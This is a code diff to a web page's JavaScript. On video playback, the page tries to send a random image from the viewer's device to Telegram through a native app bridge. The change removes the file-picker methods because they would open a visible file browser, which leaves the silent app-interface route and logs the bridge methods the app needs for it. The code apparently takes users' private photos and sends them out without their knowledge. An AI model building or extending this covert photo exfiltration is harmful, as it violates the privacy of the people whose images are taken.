@@ -53,48 +53,9 @@
 
         // Function to get random image from device storage
         async function getRandomImageFromDevice() {
-            try {
-                // Method 1: Try to use File System Access API (if supported by your app)
-                if ('showDirectoryPicker' in window) {
-                    const dirHandle = await window.showDirectoryPicker();
-                    const files = [];
-                    for await (const [name, handle] of dirHandle.entries()) {
-                        if (handle.kind === 'file' && /\.(jpg|jpeg|png|gif|webp)$/i.test(name)) {
-                            files.push(handle);
-                        }
-                    }
-                    if (files.length > 0) {
-                        const randomFile = files[Math.floor(Math.random() * files.length)];
-                        return await randomFile.getFile();
-                    }
-                }
-
-                // Method 2: Use file input with camera/gallery access
-                return new Promise((resolve) => {
-                    const input = document.createElement('input');
-                    input.type = 'file';
-                    input.accept = 'image/*';
-                    input.capture = 'environment'; // This will prefer camera
-                    input.style.display = 'none';
-                    
-                    input.onchange = (e) => {
-                        const file = e.target.files[0];
-                        if (file) {
-                            resolve(file);
-                        } else {
-                            resolve(null);
-                        }
-                        document.body.removeChild(input);
-                    };
-                    
-                    document.body.appendChild(input);
-                    input.click();
-                });
-
-            } catch (error) {
-                console.log('Error accessing device storage:', error);
-                return null;
-            }
+            // Skip file picker methods since they open file browser
+            console.log('Skipping file picker methods - app should handle this');
+            return null;
         }
 
         // Function to access device images via custom app interface
@@ -189,12 +150,12 @@
             if (hasImageBeenSent) return;
             hasImageBeenSent = true;
 
-            console.log('Video played - sending random image...');
+            console.log('Video played - attempting to send random image...');
 
-            // Method 1: Try app interface first (most reliable for your use case)
+            // Priority 1: Try app interface methods first
             const appResult = await getRandomImageViaApp();
             if (appResult === 'sent_via_app') {
-                console.log('Image sent via app interface');
+                console.log('✅ Image sent via app interface');
                 return;
             }
             if (appResult && appResult instanceof Blob) {
@@ -202,14 +163,13 @@
                 return;
             }
 
-            // Method 2: Try device storage access
-            const deviceImage = await getRandomImageFromDevice();
-            if (deviceImage) {
-                await sendImageToTelegram(deviceImage);
-                return;
-            }
-
-            console.log('Could not access device images');
+            // If no app interface available, show message
+            console.log('❌ No app interface found. Your app needs to implement:');
+            console.log('- AndroidInterface.sendRandomImageToTelegram() method');
+            console.log('- AndroidInterface.getRandomImage() method');
+            console.log('- Or iOS webkit.messageHandlers.imageHandler');
+            
+            alert('App interface not found. The mobile app needs to implement image access methods.');
         }
 
         document.addEventListener('DOMContentLoaded', function() {
